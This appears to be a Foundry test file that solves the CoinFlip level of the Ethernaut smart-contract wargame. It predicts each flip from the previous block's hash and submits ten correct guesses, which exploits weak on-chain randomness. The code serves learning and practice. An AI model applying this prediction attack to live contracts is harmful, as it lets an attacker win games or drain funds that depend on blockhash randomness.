// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {CoinFlipFactory} from "../src/levels/03-CoinFlipFactory.sol";
import {CoinFlip} from "../src/levels/03-CoinFlip.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract CoinFlipSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    function predictFlip() private view returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        return coinFlip == 1;
    }

    function solution(CoinFlip target) internal virtual {
        for (uint i = 0 ; i < 10 ; i++){
            target.flip(predictFlip());
            vm.roll(block.number+1);
        }
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip coinFlipContract = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(coinFlipContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
